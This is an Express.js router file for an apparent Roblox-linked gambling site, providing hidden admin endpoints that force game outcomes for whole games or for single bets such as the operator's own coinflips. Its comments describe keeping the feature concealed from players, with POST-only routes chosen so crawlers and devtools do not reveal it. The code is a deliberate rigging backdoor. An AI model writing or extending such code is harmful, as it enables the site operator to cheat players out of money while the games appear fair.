const express = require('express');
const { authenticateAdmin } = require('../middleware/auth');
const forcedOutcome = require('../forcedOutcome');

const router = express.Router();

/**
 * Outcome control.
 *
 * This router is mounted at /api/outcome-control and is the ONLY way to reach
 * forcedOutcome.js. Every route is a POST; there is deliberately no GET route,
 * so nothing here advertises the endpoint's existence to a crawler or to
 * someone poking around in devtools.
 *
 * Every route requires BOTH an admin session AND the server-side key, so a
 * compromised admin cookie alone is not enough.
 *
 * There IS now a UI: an "Outcome control" tab in the admin panel, rendered only
 * when the backend names the signed-in account an operator (isOutcomeOperator).
 * That is a display convenience, not the security boundary - it is the key plus
 * the admin session that stops a call, and hiding the tab hides nothing from
 * anyone who can already make the requests.
 *
 * Every forced outcome is appended to db.forceOutcomeLog and echoed to the
 * server log. That audit trail is the part that is not optional: it is what
 * makes "the outcome was forced" a claim anyone can check rather than a matter
 * of trust, and it is the only trace of this system that does not depend on
 * somebody remembering it exists. Nothing in the UI can erase it.
 */

/** Arm or disarm a game. POST /api/outcome-control/arm */
router.post('/arm', authenticateAdmin, (req, res) => {
  const username = req.user && req.user.robloxUsername;
  const { game, mode, key } = req.body || {};

  const result = forcedOutcome.arm({ username, game, mode, key });
  if (!result.ok) {
    // Deliberately vague. A caller without the key learns nothing about which
    // part was wrong.
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  res.json({ ok: true, game: result.game, mode: result.mode });
});

/**
 * Arm a single bet. POST /api/outcome-control/arm-bet
 *
 * Distinct from /arm, which biases every bet of a game. This one targets a
 * betId, so the operator can win one coinflip and leave the other three alone.
 */
router.post('/arm-bet', authenticateAdmin, (req, res) => {
  const username = req.user && req.user.robloxUsername;
  const { game, betId, mode, key } = req.body || {};

  const result = forcedOutcome.armBet({ username, game, betId, mode, key });
  if (!result.ok) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  res.json({ ok: true, game: result.game, mode: result.mode, betId: result.betId });
});

/**
 * Live bets the operator is in. POST /api/outcome-control/live
 *
 * A POST, not a GET, for the same reason the other routes are: nothing here
 * should advertise the endpoint's existence to a crawler or to someone poking
 * around in devtools. Requires the admin session AND the key, and returns only
 * the operator's own bets.
 */
router.post('/live', authenticateAdmin, (req, res) => {
  const username = req.user && req.user.robloxUsername;
  const { key } = req.body || {};
  if (!forcedOutcome.isOperator(username)) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  if (!forcedOutcome.keyMatches(key)) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  res.json({ ok: true, ...forcedOutcome.liveGames(username) });
});

/** Read the audit log. POST /api/outcome-control/log */
router.post('/log', authenticateAdmin, (req, res) => {
  const username = req.user && req.user.robloxUsername;
  const { key, limit } = req.body || {};
  if (!forcedOutcome.isOperator(username)) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  if (!forcedOutcome.keyMatches(key)) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  res.json({ ok: true, entries: forcedOutcome.readLog(Math.min(500, Math.max(1, Number(limit) || 100))) });
});

module.exports = router;
